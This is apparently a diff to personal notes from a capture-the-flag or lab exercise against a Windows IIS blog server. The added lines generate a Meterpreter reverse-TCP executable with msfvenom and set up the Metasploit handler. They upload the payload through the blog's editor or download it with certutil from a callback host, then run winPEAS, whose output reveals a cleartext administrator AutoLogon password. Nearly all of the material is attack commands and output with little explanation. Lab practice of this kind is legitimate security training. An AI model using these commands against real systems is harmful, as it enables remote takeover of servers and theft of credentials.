@@ -45,8 +45,56 @@ Access to server thru NC
 whoami
 iis apppool\blog
 
-Upload rshell.exe to server (use/admin/app/editor/editpost.cshtml (folder icon))
+msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=10.18.7.182 LPORT=5555 -f exe -o rshell.exe
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > setg LPORT 5555
+LPORT => 5555
+msf6 exploit(multi/handler) > setg LHOST 10.18.7.182
+LHOST => 10.18.7.182
+msf6 exploit(multi/handler) > run
+
+
+Upload rshell.exe to server (use/admin/app/editor/editpost.cshtml (folder icon) or "certutil -urlcache -f http://10.11.11.30/rshell.exe rshell.exe")
 
 c:\inetpub\wwwroot\App_Data\files\rshell.exe
+
+
+
+shell (startar shell)
+net start (listar tjänster som körs)
+
+winpeas.bat
+
+[+] GPP Password
+                                                                                                       
+ [+] Cloud Credentials                                                                                 
+                                                                                                       
+ [+] AppCmd                                                                                            
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#appcmd-exe     
+C:\Windows\system32\inetsrv\appcmd.exe exists.                                                         
+                                                                                                       
+ [+] Files in registry that may contain credentials                                                    
+   [i] Searching specific files that may contains credentials.                                         
+   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files                                                                                              
+Looking inside HKCU\Software\ORL\WinVNC3\Password                                                      
+Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password                                    
+Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon                              
+    LastUsedUsername    REG_SZ    administrator                                                        
+    DefaultUserName    REG_SZ    administrator                                                         
+    DefaultPassword    REG_SZ    4q6XvFES7Fdxs                                                         
+Looking inside HKLM\SYSTEM\CurrentControlSet\Services\SNMP                                             
+                                                                                                       
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters                                   
+                                                                                                       
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ExtensionAgents                   
+    W3SVC    REG_SZ    Software\Microsoft\W3SVC\CurrentVersion                                         
+                                                                                                       
+Looking inside HKCU\Software\TightVNC\Server                                                           
+Looking inside HKCU\Software\SimonTatham\PuTTY\Sessions                                                
+Looking inside HKCU\Software\OpenSSH\Agent\Keys     
+
+
+
 
 
